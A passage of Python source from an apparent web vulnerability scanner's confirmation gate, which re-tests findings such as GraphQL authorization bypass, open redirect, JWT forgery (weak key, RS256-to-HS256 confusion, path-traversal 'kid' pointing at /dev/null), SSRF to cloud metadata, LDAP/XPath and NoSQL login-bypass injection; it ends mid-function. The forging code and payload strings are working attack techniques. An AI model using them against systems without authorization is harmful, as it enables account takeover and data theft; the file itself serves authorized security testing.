    eff_markers = [m for m in markers if m.lower() not in q_low]
    if not eff_markers:
        return False, 0.3, ("the private marker(s) also appear in the query itself — an "
                            "error echo could false-confirm; choose a marker NOT present in "
                            "the query (lead)")

    async def _post(headers):
        h = dict(headers or {})
        h.setdefault("Content-Type", "application/json")
        return await fetch("POST", url, headers=h, body=body, timeout=timeout,
                           use_session_auth=False)

    def _has_marker(resp) -> bool:
        """The marker must appear inside the response's non-null JSON ``data`` — NOT in an
        ``errors`` message (GraphQL returns HTTP 200 for authz errors, and an authorization
        resolver idiomatically echoes the requested id, which would otherwise false-confirm
        a bypass that never returned data). Falls back to a raw body test only for a
        non-JSON body."""
        b = (getattr(resp, "body", "") if resp else "") or ""
        if not b:
            return False
        try:
            parsed = _json.loads(b)
        except (ValueError, TypeError):
            return any(m in b for m in eff_markers)   # non-JSON body: best-effort
        data = parsed.get("data") if isinstance(parsed, dict) else None
        if not data:                                   # null/absent data (error-only) -> no leak
            return False
        blob = _json.dumps(data)
        return any(m in blob for m in eff_markers)

    owner_r = await _post(owner_h)
    if not _has_marker(owner_r):
        return False, 0.2, ("the query did not return the owner's private marker for the "
                            "OWNER session — can't establish a baseline (lead)")
    anon_r = await _post(None)
    if _has_marker(anon_r):
        return False, 0.2, ("the field is returned ANONYMOUSLY (public data, not an "
                            "authorization bypass) — lead")
    att_r = await _post(att_h)
    if _has_marker(att_r):
        return True, 0.9, ("GraphQL field-level authorization bypass: a DIFFERENT identity "
                           "read the owner's private field data (BOLA/BFLA over GraphQL, "
                           "CWE-639)")
    return False, 0.2, ("the attacker identity did not receive the owner's private data — "
                        "field authorization holds (lead)")


async def _recheck_open_redirect(finding, fetch, timeout):
    """Confirm an open redirect (CWE-601) by injecting a FRESH random attacker host
    into the redirect parameter and requiring the server to actually REDIRECT there.

    Independence: the host is one the server has NEVER seen (secrets.token_hex), so a
    hardcoded redirect or a body-echoed constant can't reproduce it — only genuine
    parameter-driven control can. Detection is single-sourced from the worker's
    ``detect_redirect_to`` (3xx Location / auto meta-refresh / load-time JS, never a
    click-handler reflection). A benign SAME-HOST control must NOT resolve to the
    fresh host, proving the redirect target tracks our input rather than being fixed.
    GET-only, non-destructive."""
    import secrets
    from core.swarm_workers.vuln._http import add_query
    from core.swarm_workers.vuln.open_redirect import _host_of, detect_redirect_to
    param = finding.get("parameter")
    url = finding.get("url") or ""
    if not (param and url):
        return False, 0.0, "open-redirect finding missing url/parameter — can't re-test"
    host = f"viper-oredir-{secrets.token_hex(6)}.example"
    hit = None
    for payload in (f"https://{host}/x", f"//{host}"):   # absolute then scheme-relative
        r = await fetch("GET", add_query(url, param, payload), timeout=timeout,
                        follow_redirects=False)
        if r is None:
            continue
        hit = detect_redirect_to(r, host)
        if hit:
            break
    if not hit:
        return False, 0.2, ("fresh random attacker host is not the redirect target — "
                            "no parameter-driven redirect (lead)")
    channel, evidence = hit
    # Benign control: a SAME-HOST value must not make the fresh host the target. If
    # it does, the redirect isn't driven by our input (fixed/echoed) -> lead.
    own = _host_of(url) or "example.com"
    ctrl = await fetch("GET", add_query(url, param, f"https://{own}/ok"),
                       timeout=timeout, follow_redirects=False)
    if ctrl is not None and detect_redirect_to(ctrl, host):
        return False, 0.2, ("redirect target does not track the parameter value "
                            "(fixed/echoed) — not attacker-controlled (lead)")
    conf = 0.85 if channel == "location_header" else 0.75
    return True, conf, (f"parameter '{param}' redirects to a fresh random attacker host "
                        f"via {channel} ({evidence[:80]}), absent under a benign control "
                        f"— attacker-controlled open redirect")


# A RICHER introspection query than the worker's name-only projection: it asks for
# queryType and each type's `kind`. A real GraphQL server answers with a queryType
# name and canonical `kind` enums; a generic JSON API that merely nests
# {"__schema":{"types":[{"name":...}]}} cannot conjure these on demand — so the gate
# is a genuinely STRONGER, orthogonal confirmation than the worker.
_GATE_INTROSPECTION_Q = ('{"query":"{ __schema { queryType { name } '
                         'types { name kind } } }"}')
# The canonical GraphQL __TypeKind enum. A metadata API using kind="table"/"view"
# fails this, so a coincidental {"name":...,"kind":...} blob is not mistaken for GraphQL.
_GQL_TYPE_KINDS = {"SCALAR", "OBJECT", "INTERFACE", "UNION", "ENUM",
                   "INPUT_OBJECT", "LIST", "NON_NULL"}


async def _recheck_graphql(finding, fetch, timeout):
    """Confirm GraphQL exposure by an INDEPENDENT, STRONGER re-query.

    Introspection: issue a richer query than the worker's minimal one — asking for
    queryType and each type's ``kind`` — and require a canonical GraphQL signal
    (a queryType name, or >=2 types carrying a canonical ``__TypeKind`` enum). We
    deliberately do NOT reuse the worker's name-only fallback: a generic metadata
    API can coincidentally return ``{"__schema":{"types":[{"name":...}]}}``, so
    name-only is not proof. IDE: re-GET and re-match the live-IDE bootstrap markers.
    ``graphql_endpoint`` (introspection blocked, severity info) has no impact to
    confirm -> stays a lead. Read-only introspection only."""
    import json
    from core.swarm_workers.vuln.graphql import _IDE_LIVE_MARKERS
    url = finding.get("url") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    head = (finding.get("vuln_type") or "").lower().split(":")[0]
    if head == "graphql_ide":
        r = await fetch("GET", url, timeout=timeout)
        if r is None or not (200 <= getattr(r, "status", 0) < 300):
            return False, 0.2, "IDE url no longer serves 2xx (lead)"
        body = getattr(r, "body", "") or ""
        ctype = (getattr(r, "headers", {}) or {}).get("content-type", "")
        if ctype and "html" not in ctype.lower():
            return False, 0.2, "IDE endpoint no longer HTML (lead)"
        m = _IDE_LIVE_MARKERS.search(body)
        if m:
            return True, 0.7, (f"live GraphQL IDE bootstrap marker reproduced on re-fetch "
                               f"({m.group(0)[:60]!r})")
        return False, 0.2, "no live-IDE bootstrap marker on re-fetch (prose mention, lead)"
    # introspection (or generic graphql head): re-run a RICHER introspection query.
    r = await fetch("POST", url, headers={"Content-Type": "application/json"},
                    body=_GATE_INTROSPECTION_Q.encode("utf-8"), timeout=timeout,
                    follow_redirects=False)
    if r is None:
        return False, 0.0, "introspection re-query failed"
    ctype = (getattr(r, "headers", {}) or {}).get("content-type", "")
    if ctype and "json" not in ctype.lower():
        return False, 0.2, "introspection response is not JSON — not a GraphQL schema (lead)"
    try:
        data = json.loads(getattr(r, "body", "") or "")
    except (ValueError, TypeError):
        return False, 0.2, "introspection response is not valid JSON (lead)"
    schema_obj = ((data or {}).get("data", {}) or {}).get("__schema") or {}
    if not isinstance(schema_obj, dict):
        return False, 0.2, "no __schema object — not GraphQL introspection (lead)"
    types = schema_obj.get("types") or []
    qt = schema_obj.get("queryType")
    has_query_type = isinstance(qt, dict) and bool(qt.get("name"))
    canonical_kinds = sum(
        1 for t in types
        if isinstance(t, dict) and str(t.get("kind", "")).upper() in _GQL_TYPE_KINDS)
    # Require BOTH GraphQL-specific signals together: (1) queryType names the root
    # Query type — a concept a REST/metadata API has no reason to emit under
    # data.__schema — AND (2) at least one type carrying a canonical __TypeKind enum.
    # Either alone is spoofable by a JSON blob that coincidentally reuses one shape
    # (a schema-listing API using an "OBJECT"/"SCALAR" label, or one that nests a
    # "queryType" key); together they mean the endpoint actually answered a GraphQL
    # introspection query with a genuine __Schema result. Every compliant GraphQL
    # server with introspection enabled returns both for our query, so recall holds.
    strong = has_query_type and canonical_kinds >= 1
    if types and strong:
        return True, 0.7, (f"independent introspection re-query returned a genuine GraphQL "
                           f"__Schema: named queryType + {canonical_kinds} canonical "
                           f"__TypeKind(s) across {len(types)} types")
    return False, 0.2, ("introspection query did not return a genuine GraphQL __Schema "
                        "(needs a named queryType AND a canonical __TypeKind) — "
                        "introspection disabled, or a generic JSON endpoint that merely "
                        "nests __schema (lead)")


async def _hmac_forge_accept_probe(fetch, timeout, endpoint, header, payload,
                                   key_bytes, digest, src, kind):
    """Shared forge-accept differential for HMAC-verified JWTs (weak-key OR
    RS256->HS256 confusion). Forge ``header.payload`` (plus a benign marker claim)
    signed with HMAC(``key_bytes``) and send it TWICE bracketing a bad-signature
    control. Confirm ONLY when the forged token is accepted BOTH times AND the control
    is rejected (401/403) — so a stateful endpoint (nonce/single-use) can't fake it and
    the control's rejection is attributable to its signature alone. GET-only."""
    import hmac as _hmac
    import json as _json
    import secrets as _secrets
    from core.swarm_workers.vuln.jwt import _b64url_encode
    payload = dict(payload)
    payload["viper_recheck"] = _secrets.token_hex(6)   # benign marker; no privilege change
    h_b64 = _b64url_encode(_json.dumps(header, separators=(",", ":")).encode())
    p_b64 = _b64url_encode(_json.dumps(payload, separators=(",", ":")).encode())
    signing_input = (h_b64 + "." + p_b64).encode("ascii")
    good_sig = _b64url_encode(_hmac.new(key_bytes, signing_input, digest).digest())
    forged = f"{h_b64}.{p_b64}.{good_sig}"
    control = f"{h_b64}.{p_b64}.{_b64url_encode(b'viper-invalid-signature')}"

    async def _probe(token):
        headers = {"Authorization": f"Bearer {token}"}
        if src and src != "authorization":     # token was set as a cookie
            headers["Cookie"] = f"{src}={token}"
        return await fetch("GET", endpoint, headers=headers, timeout=timeout,
                           use_session_auth=False)
    forged_r = await _probe(forged)
    control_r = await _probe(control)
    forged_r2 = await _probe(forged)
    if forged_r is None or control_r is None or forged_r2 is None:
        return False, 0.0, "forge-probe request failed (lead)"
    fs = getattr(forged_r, "status", 0)
    cs = getattr(control_r, "status", 0)
    fs2 = getattr(forged_r2, "status", 0)
    forged_ok = (200 <= fs < 300) and (200 <= fs2 < 300)
    if forged_ok and cs in (401, 403):
        return True, 0.85, (f"server accepted a {kind}-forged token REPEATABLY (HTTP "
                            f"{fs}/{fs2}) but rejected a bad-signature control (HTTP {cs}) "
                            "— stateless signature verification; JWT forgery confirmed (CWE-347)")
    if (200 <= fs < 300) and not (200 <= fs2 < 300):
        return False, 0.2, (f"forged token accepted once (HTTP {fs}) then rejected on repeat "
                            f"(HTTP {fs2}) — order/state-dependent (nonce/single-use/replay), "
                            "not a stateless signature bypass (lead)")
    if (200 <= fs < 300) and (200 <= cs < 300):
        return False, 0.2, ("both the forged and the bad-signature token were accepted — "
                            "the endpoint does not verify signatures / needs no auth (lead)")
    return False, 0.2, (f"forged token not accepted (HTTP {fs}) — forgery unconfirmed at "
                        "this endpoint (lead)")


async def _recheck_jwt_alg_confusion(finding, fetch, timeout):
    """Confirm an RS256->HS256 algorithm-confusion bypass. The RSA public key is public
    (jwks.json), so a verifier that trusts the token's alg header can be tricked into
    HMAC-verifying an attacker HS256 token whose secret IS the public-key PEM. Opt-in
    like the weak-key path: stays a LEAD until an operator jwt_probe_endpoint proves the
    forged HS256 token is accepted where a bad-signature control is rejected. The forged
    token carries the original claims + a benign marker (no privilege change); GET-only."""
    import hashlib as _hashlib
    from core.swarm_workers.vuln.jwt import _parse_jwt
    endpoint = (finding.get("jwt_probe_endpoint") or "").strip()
    if not endpoint:
        return False, 0.3, ("RS256->HS256 alg-confusion candidate (RSA public key published + "
                            "an identity token) — supply jwt_probe_endpoint (an in-scope authed "
                            "GET) to confirm the forged HS256 token is accepted (lead)")
    # Credential fields are underscore-prefixed so serializers skip them; keep a plain-name
    # fallback for externally-supplied / imported findings.
    tok = finding.get("_jwt_token") or finding.get("jwt_token") or ""
    pem = finding.get("jwt_pubkey_pem") or ""
    if not tok or not pem:
        return False, 0.0, "alg-confusion finding missing token / public-key PEM (lead)"
    parsed = _parse_jwt(tok)
    if not parsed:
        return False, 0.0, "could not parse the RS-signed token to forge (lead)"
    header, payload, _ = parsed
    header = dict(header)
    header["alg"] = "HS256"    # downgrade to HMAC; the public-key PEM is now the secret
    src = (finding.get("jwt_source") or "authorization").lower()
    return await _hmac_forge_accept_probe(
        fetch, timeout, endpoint, header, payload, pem.encode("utf-8"),
        _hashlib.sha256, src, "public-key-as-HMAC (RS256->HS256 confusion)")


# `kid` values that make a mis-designed verifier load an EMPTY/known key file (path
# traversal to /dev/null) — forging with an empty HMAC key then verifies.
_KID_EMPTY_KEY_PAYLOADS = (
    "../../../../../../../../../../dev/null",
    "/dev/null",
    "....//....//....//....//....//dev/null",
    "..\\..\\..\\..\\..\\..\\..\\..\\nul",     # Windows NUL device
)


async def _recheck_jwt_kid_inject(finding, fetch, timeout):
    """JWT ``kid`` (Key ID) header injection (CWE-347). A verifier that resolves the token's
    `kid` header to a KEY FILE and HMAC-verifies with that file's contents is forgeable: a
    path-traversal `kid` pointing at an empty file (``/dev/null``) yields an EMPTY key an
    attacker also knows. Confirmed only by the SAME opt-in forge-accept probe as weak-key /
    alg-confusion: forge the token with ``alg:HS256``, the malicious `kid`, and an EMPTY HMAC
    key, and require the server to ACCEPT it (2xx, repeatably) where a bad-signature control
    is rejected (401/403). Opt-in (operator ``jwt_probe_endpoint``), GET-only, no privilege
    escalation (a benign marker claim only). Stays a lead until proven."""
    import hashlib as _hashlib
    from core.swarm_workers.vuln.jwt import _parse_jwt
    endpoint = (finding.get("jwt_probe_endpoint") or "").strip()
    if not endpoint:
        return False, 0.3, ("JWT carries a `kid` header — a verifier that resolves it to a "
                            "key FILE is forgeable with a path-traversal kid + empty key; "
                            "supply jwt_probe_endpoint (an in-scope authed GET) to confirm "
                            "(lead)")
    tok = finding.get("_jwt_token") or finding.get("jwt_token") or ""
    if not tok:
        return False, 0.0, "kid-inject finding missing token to forge (lead)"
    parsed = _parse_jwt(tok)
    if not parsed:
        return False, 0.0, "could not parse the JWT to forge (lead)"
    header, payload, _ = parsed
    src = (finding.get("jwt_source") or "authorization").lower()
    for kid in _KID_EMPTY_KEY_PAYLOADS:
        h = dict(header)
        h["alg"] = "HS256"
        h["kid"] = kid
        ok, conf, reason = await _hmac_forge_accept_probe(
            fetch, timeout, endpoint, h, payload, b"", _hashlib.sha256, src,
            f"kid-injection (kid path-traversal -> empty key)")
        if ok:
            return ok, conf, reason
    return False, 0.3, ("forged tokens with a path-traversal `kid` + empty key were not "
                        "accepted — kid does not resolve to a key file here (lead)")


async def _recheck_jwt(finding, fetch, timeout):
    """Confirm a weak-HMAC-key JWT only by proving the SERVER ACCEPTS A FORGERY.

    Cracking the key offline proves the key is weak, not that the live token handler
    verifies with it — so this stays a LEAD unless the operator supplies an in-scope
    authed endpoint (``jwt_probe_endpoint``). Given one, the gate forges the ORIGINAL
    token with a single added BENIGN marker claim (no identity/privilege change),
    re-signed with the recovered key, plus a matching GARBAGE-signature control, and
    GETs the endpoint with each. Submittable iff the forged token is accepted (2xx)
    where the bad-signature control is rejected (401/403) — proof the server verifies
    signatures with the weak key, so arbitrary forgery is possible (CWE-347). GET-only,
    no privilege escalation. Non-weak-key jwt observations stay leads."""
    vt = (finding.get("vuln_type") or "").lower()
    if ":alg_confusion" in vt:
        return await _recheck_jwt_alg_confusion(finding, fetch, timeout)
    if ":kid_inject" in vt:
        return await _recheck_jwt_kid_inject(finding, fetch, timeout)
    if ":weak_key" not in vt or vt.endswith(("_noauth", "_sample")):
        return False, 0.3, "jwt observation — no safe read-only auto-confirmation (lead)"
    endpoint = (finding.get("jwt_probe_endpoint") or "").strip()
    if not endpoint:
        return False, 0.3, ("weak HMAC key recovered OFFLINE, but the server's acceptance "
                            "of a forged token is unproven — supply jwt_probe_endpoint (an "
                            "in-scope authed GET) to confirm forgeability (lead)")
    tok = finding.get("_jwt_token") or finding.get("jwt_token") or ""
    key = finding.get("_jwt_key")
    if key is None:
        key = finding.get("jwt_key")
    alg = (finding.get("jwt_alg") or "").upper()
    if not tok or key is None or alg not in ("HS256", "HS384", "HS512"):
        return False, 0.0, "jwt finding missing token/key/alg for a forge-probe (lead)"
    import hashlib as _hashlib
    from core.swarm_workers.vuln.jwt import _parse_jwt
    parsed = _parse_jwt(tok)
    if not parsed:
        return False, 0.0, "could not parse the original JWT to forge (lead)"
    header, payload, _ = parsed
    digest = {"HS256": _hashlib.sha256, "HS384": _hashlib.sha384,
              "HS512": _hashlib.sha512}[alg]
    src = (finding.get("jwt_source") or "authorization").lower()
    return await _hmac_forge_accept_probe(
        fetch, timeout, endpoint, header, payload, key.encode("utf-8"), digest, src,
        "weak-key")


async def _recheck_query_injection(finding, fetch, timeout):
    """Independently reproduce the LDAP/XPath injection error differential (read-only).

    Mirrors the SSRF recheck discipline: a benign control value must NOT emit the
    ENGINE-SPECIFIC error (the worker's own library/stack-trace signatures — so what we
    confirm is exactly what it detected), while the finding's breaker payload MUST. Three
    guards close the adversarial FP vectors an in-band error differential otherwise carries:
      * the reflected control token / breaker payload is stripped from each body before
        matching, so a pure-reflection or search-echo endpoint can't supply a hit;
      * a control that already errors is vetoed as noise (a search-over-docs index or a
        canned error page, not an injection); and
      * a WAF/denial body on the probe is vetoed (a defending guard, not a backend error).
    The signatures being library tokens (javax.naming / XPathException / SimpleXMLElement::
    xpath / ...) rather than prose is itself the primary guard: ordinary indexed content
    doesn't carry stack-trace tokens, so the docs-search FP can't beat the differential."""
    vt = (finding.get("vuln_type") or "").lower()
    kind = "ldap" if "ldap" in vt else "xpath"
    from core.swarm_workers.vuln._http import add_query
    from core.swarm_workers.vuln.query_injection import LDAP_ERR, XPATH_ERR, _BENIGN
    from core.swarm_workers.vuln.ssrf import _DENIAL_LANGUAGE
    err_re = LDAP_ERR if kind == "ldap" else XPATH_ERR
    url = finding.get("url") or ""
    param = finding.get("parameter")
    payload = finding.get("payload") or ""
    if not (url and param and payload):
        return False, 0.0, "query-injection finding missing url/parameter/payload (lead)"
    control = await fetch("GET", add_query(url, param, _BENIGN), timeout=timeout)
    cbody = ((getattr(control, "body", "") if control else "") or "").replace(_BENIGN, "")
    if err_re.search(cbody):
        return False, 0.2, ("a benign value already triggers the engine error — the endpoint "
                            "is noisy (search index / canned page), not injectable (lead)")
    probe = await fetch("GET", add_query(url, param, payload), timeout=timeout)
    if probe is None:
        return False, 0.0, "re-fetch failed"
    pbody = (getattr(probe, "body", "") or "").replace(payload, "")
    if _DENIAL_LANGUAGE.search(pbody):
        return False, 0.2, ("response reads as a WAF/blocked refusal, not a backend engine "
                            "error (lead)")
    m = err_re.search(pbody)
    if m:
        label = "LDAP" if kind == "ldap" else "XPath"
        return True, 0.8, (f"{label} injection reproduced: the breaker payload emitted an "
                           f"engine error ({m.group(0)[:60]!r}) absent for a benign control "
                           f"— the value is concatenated into a {label} query "
                           f"({'CWE-90' if kind == 'ldap' else 'CWE-643'})")
    return False, 0.3, "engine error not reproduced on re-test (lead)"


async def _recheck_ssrf(finding, fetch, timeout):
    """Independently reproduce the RESPONSE-BASED SSRF differential (read-only GETs).

    Re-runs the worker's own gate-3 logic from a fresh context: a benign baseline
    (example.com) must NOT carry cloud-metadata markers, while the finding's internal
    metadata payload MUST return the service's own 2xx/3xx body carrying either an
    unforgeable AKIA/ASIA credential VALUE or >=2 distinct metadata markers absent
    from the baseline — with the reflected payload stripped (kills pure-reflection
    open-redirect-validator FPs) and denial/WAF prose vetoed (kills defending-guard
    FPs). Blind SSRF is confirmed earlier via its OOB token, so only in-band
    ``ssrf:<param>`` findings reach here; a blind one that slipped through stays a lead."""
    vt = (finding.get("vuln_type") or "").lower()
    if ":blind:" in vt:
        return False, 0.3, ("blind SSRF candidate — only an out-of-band callback confirms "
                            "it; run with an OOB listener (--oob) (lead)")
    from core.swarm_workers.vuln._http import add_query
    from core.swarm_workers.vuln.ssrf import (
        _BENIGN_PAYLOAD, _CREDENTIAL_VALUE, _DENIAL_LANGUAGE, _markers)
    url = finding.get("url") or ""
    param = finding.get("parameter")
    payload = finding.get("payload") or ""
    if not (url and param and payload):
        return False, 0.0, "ssrf finding missing url/parameter/payload to re-test (lead)"
    baseline = await fetch("GET", add_query(url, param, _BENIGN_PAYLOAD), timeout=timeout)
    base_markers = _markers(baseline, _BENIGN_PAYLOAD)
    probe = await fetch("GET", add_query(url, param, payload), timeout=timeout)
    if probe is None:
        return False, 0.0, "re-fetch failed"
    if not (200 <= getattr(probe, "status", 0) < 400):
        return False, 0.2, ("internal payload no longer returns 2xx/3xx — a guard refused it, "
                            "not a proxied fetch (lead)")
    stripped = (getattr(probe, "body", "") or "").replace(payload, "")
    if _DENIAL_LANGUAGE.search(stripped):
        return False, 0.2, ("response reads as a security refusal (WAF/blocked/denied), not "
                            "the metadata service's output (lead)")
    found = _markers(probe, payload) - base_markers
    has_cred = bool(_CREDENTIAL_VALUE.search(stripped))
    # Mirror the worker's gate-3 (ssrf.py): confirm on (a credential VALUE co-occurring
    # with >=1 metadata marker) OR (>=2 distinct markers). A bare AKIA/ASIA-shaped
    # string with NO metadata marker is a coincidental benign vendor token — not proof
    # the server proxied the metadata service (a real IMDS credential body always also
    # carries the AccessKeyId marker, so recall is unaffected).
    if found and (has_cred or len(found) >= 2):
        conf = 0.85 if has_cred else 0.8
        lead = "a real cloud credential alongside " if has_cred else ""
        return True, conf, (f"SSRF reproduced: {lead}{sorted(found)} cloud-metadata markers "
                            "returned for the internal payload, absent from the benign "
                            "baseline — the server proxied the metadata service (CWE-918)")
    return False, 0.3, ("not enough independent metadata evidence on re-test (a bare "
                        "credential-shaped string, or a single name-marker, is coincidental) "
                        "— manual review (lead)")


async def _recheck_nosql(finding, fetch, timeout):
    """Independently reproduce the NoSQL operator-injection AUTH BYPASS differential.

    Only the login sub-class (``nosql_injection:login``) carries an un-spoofable
    proof: a bogus credential must NOT mint a session token, while the finding's
    operator body (e.g. ``{"email":{"$ne":null},...}``) MUST — the same
    token-presence proof ``login_sqli`` uses. The gate re-runs both halves from a
    fresh context, reusing the worker's own ``_has_token`` predicate so detection is
    single-sourced. Login attempts only; any session is never used. Submittable iff
    BOTH halves reproduce. The weaker query sub-class stays a lead."""
    import json as _json
    vt = (finding.get("vuln_type") or "").lower()
    if ":login" not in vt:
        return False, 0.0, ("NoSQL query-divergence candidate — no safe token-differential "
                            "proof; manual review (lead)")
    from core.swarm_workers.vuln.nosql_injection import _has_token
    url = finding.get("url") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    raw = finding.get("payload")
    try:
        op_body = _json.loads(raw) if isinstance(raw, str) else (raw or {})
    except (ValueError, TypeError):
        op_body = {}
    if not isinstance(op_body, dict) or not op_body:
        return False, 0.0, "nosql finding carries no operator login body to replay (lead)"

    async def _post(body_obj):
        try:
            return await fetch("POST", url,
                               headers={"Content-Type": "application/json"},
                               body=_json.dumps(body_obj).encode(), timeout=timeout,
                               follow_redirects=False)
        except Exception:   # noqa: BLE001 — fail closed
            return None
    # Baseline discipline: a bogus STRING credential must NOT mint a token, else the
    # endpoint hands sessions to anyone and a token proves no injection.
    baseline = await _post({"email": "viper_nomatch_zzz9@example.invalid",
                            "password": "viper_wrong_zzz9"})
    if _has_token(baseline):
        return False, 0.2, ("login endpoint mints a token for a bogus credential too "
                            "— not an injection signal (lead)")
    # Operator-SEMANTICS control: an object body with the SAME shape but an $eq to a
    # bogus value must ALSO mint no token. A genuinely injectable query runs $eq
    # against a non-existent record and matches nothing; only the match-all operators
    # ($ne/$gt) bypass auth. If this $eq control DOES mint a token, the session is
    # driven by sending an object-typed credential (a guest/anon session, a code path
    # unrelated to auth), NOT by operator matching — so it is not a confirmed bypass.
    eq_ctrl = await _post({"email": {"$eq": "viper_nomatch_zzz9@example.invalid"},
                           "password": {"$eq": "viper_wrong_zzz9"}})
    if _has_token(eq_ctrl):
        return False, 0.2, ("an $eq-to-bogus object body also mints a token — the session "
                            "is not driven by operator matching semantics, so this is not "
                            "a confirmed injection (lead)")
    inj = await _post(op_body)
    if _has_token(inj):
        return True, 0.9, ("a match-all operator body minted a session token while both a "
                           "bogus string credential AND an $eq-to-bogus object body did "
                           "not — operator-driven NoSQL auth bypass reproduced (CWE-943)")
    return False, 0.3, "operator login body did not re-mint a token on re-test (lead)"


async def _reconfirm(finding: dict, fetch, timeout: float,
                     bola_config=None, oob_store=None) -> Tuple[bool, float, str]:
    """Independently re-test a swarm finding by its OWN shape (fresh request).

    Confirms the config/exposure classes an unauthenticated hunt actually finds,
    with a behavioral probe (not a pattern echo). Injection classes (sqli/xss/
    ssti/cmdi/lfi/idor) are left as leads here — the hardened worker already did
    a baseline differential, but the gate does not yet have an orthogonal
    behavioral re-test for them, so it stays conservative (fail-closed)."""
    # OUT-OF-BAND confirmation comes first: if the finding fired a canary probe
    # and our listener recorded an interaction for that token, the target's
    # backend reached out to us — irrefutable proof of a blind vulnerability,
    # stronger than any in-band signal. (A token with no interaction is a blind
    # probe that did not fire -> lead, never submittable.)
    oob_token = finding.get("oob_token")
    if oob_token and oob_store is not None:
        from core.oob.canary import is_canary_token
        if not is_canary_token(oob_token):
            return False, 0.0, "oob token has invalid format — not confirmed"
        try:
            hit = oob_store.has_interaction(oob_token)
        except Exception as e:   # noqa: BLE001 — fail closed, but surface the cause
            logger.warning("oob_store.has_interaction failed: %s", e)
            hit = False
        if hit:
            n = len(oob_store.interactions_for(oob_token))
            # An out-of-band callback is the strongest confirmation there is — mark it
            # so the strict-retest classes (cmdi/rce) accept it as trustworthy proof.
            finding["retest_type"] = "oob_confirmed"
            return True, 0.95, (f"confirmed via out-of-band interaction: canary "
                                f"{oob_token} received {n} callback(s)")
        return False, 0.3, ("out-of-band payload fired but no interaction observed "
                            "— unconfirmed (lead)")

    url = finding.get("url") or finding.get("target") or ""
    if not url:
        return False, 0.0, "no url to re-test"
    head = (finding.get("vuln_type") or finding.get("type") or "").lower().split(":")[0]

    # CORS — reflect a FRESH arbitrary origin the worker never sent.
    if head.startswith("cors"):
        r = await fetch("GET", url, headers={"Origin": _PROBE_ORIGIN}, timeout=timeout)
        if r is None:
            return False, 0.0, "re-fetch failed"
        # A CORS reflection on a static asset (css/js/font/image) exposes nothing
        # sensitive — even with credentials it is not a real bug.
        if any(a in _ctype(r) for a in _STATIC_CT):
            return False, 0.2, "static-asset endpoint — CORS reflection exposes no sensitive data (lead)"
        aco = (r.headers or {}).get("access-control-allow-origin", "")
        acc = (r.headers or {}).get("access-control-allow-credentials", "").lower()
        # Only submittable when credentials are ALSO allowed — a reflected origin
        # without credentials exposes only data the server already made public.
        if aco == _PROBE_ORIGIN and acc == "true":
            return True, 0.85, ("server reflects an arbitrary Origin AND allows "
                                "credentials — an attacker site can read authenticated responses")
        if aco == _PROBE_ORIGIN:
            return False, 0.3, ("arbitrary Origin reflected but Allow-Credentials is "
                                "not true — exposes only public data (lead)")
        return False, 0.2, "arbitrary origin not reflected (no real CORS bug)"

    # Directory listing / sensitive-file exposure — re-fetch, confirm shape.
    if head in ("information_disclosure", "dir_listing", "directory_listing"):
        r = await fetch("GET", url, timeout=timeout)
        if r is None or not (200 <= getattr(r, "status", 0) < 300):
            return False, 0.1, "url no longer serves 2xx"
        if _AUTOINDEX.search(_body(r)):
            return True, 0.7, "real directory autoindex (Apache/nginx/IIS) reproduced on re-fetch"
        return False, 0.2, "no autoindex structure — prose/links, not a directory listing"

    # Exposed .env / config — env-var lines with a REAL secret value, not HTML,
    # and not a committed .env.example/template (placeholders).
    if head in ("env_exposed", "actuator_env"):
        if any(url.lower().rstrip("/").endswith(s)
               for s in (".example", ".sample", ".dist", ".template")):
            return False, 0.1, "looks like a committed .env.example/template, not a live secret file"
        r = await fetch("GET", url, timeout=timeout)
        if r is None or not (200 <= getattr(r, "status", 0) < 300):
            return False, 0.1, "env url no longer 2xx"
        body = getattr(r, "body", "") or ""
        if "text/html" in _ctype(r):
            return False, 0.2, "HTML body — not a raw env file"
        m = _SECRET_SHAPE.search(body)
        if _ENV_LINE.search(body) and m:
            ctx = body[max(0, m.start() - 12):m.end() + 12]
            # Same placeholder guard the secrets branch uses — reject AWS's canonical
            # AKIA…EXAMPLE / YOUR_KEY / <token> documented values.
            if not _SECRET_PLACEHOLDER.search(m.group(0)) and not _SECRET_PLACEHOLDER.search(ctx):
                return True, 0.85, "env file with KEY=value lines AND a real (non-placeholder) credential"
        return False, 0.2, "env-shaped but no live secret value — placeholder/sample (lead)"

    # Exposed .git
    if head == "git_exposed":
        r = await fetch("GET", url, timeout=timeout)
        if r is not None and 200 <= getattr(r, "status", 0) < 300 \
                and ("[core]" in (getattr(r, "body", "") or "")
                     or "ref:" in (getattr(r, "body", "") or "")):
            return True, 0.8, ".git metadata reproduced on re-fetch"
        return False, 0.2, "no .git content on re-test"

    # Injection classes: orthogonal behavioral re-test (fresh, differential probe).
    vt_full = (finding.get("vuln_type") or "").lower()
    if head in ("xss", "xss_text", "xss_tag", "dom_xss"):
        return await _recheck_xss(finding, fetch, timeout)
    if head in ("sqli", "sqli_blind", "auth_bypass", "login_sqli"):
        return await _recheck_sqli(finding, fetch, timeout)
    if head in ("ssti", "ssti_error"):
        return await _recheck_ssti(finding, fetch, timeout)
    if head in ("lfi", "path_traversal"):
        return await _recheck_lfi(finding, fetch, timeout)
    if head in ("rce", "cmdi", "command_injection"):
        return await _recheck_cmdi(finding, fetch, timeout)
    if head in ("secret", "secrets", "js_secret", "github_secret"):
        return await _recheck_secrets(finding, fetch, timeout)
    # Two-account BFLA: the find_bfla engine already proved a low-priv identity
    # invoking a privileged function (admin+low+anon probes) — confirmed. Checked
    # before the access_control re-test because its vuln_type head IS
    # "access_control" but the two-account proof is the right confirmation.
    # Trust ONLY findings that carry the engine's provenance (owner+attacker), so
    # a stray ":bfla:" string can't masquerade as confirmed.
    # A finding imported from an EXTERNAL tool (source=mcp:*) is never trusted on
    # its vuln_type alone — it must pass an actual VIPER re-test like anything
    # untrusted. So external findings skip the engine-trust short-circuits below.
    _external = str(finding.get("source") or "").startswith("mcp:")
    if (":bfla:" in vt_full or head == "bfla") and not _external:
        if finding.get("owner") and finding.get("attacker"):
            return True, 0.85, "low-privilege access to a privileged function confirmed by the BFLA engine"
        return False, 0.0, "bfla finding missing two-identity provenance — not confirmed"
    if head.startswith("crlf"):
        return await _recheck_crlf(finding, fetch, timeout)
    if head == "xxe":
        return await _recheck_xxe(finding, fetch, timeout)
    if head.startswith("clickjacking"):
        return await _recheck_clickjacking(finding, fetch, timeout)
    if head == "cloud_exposure":
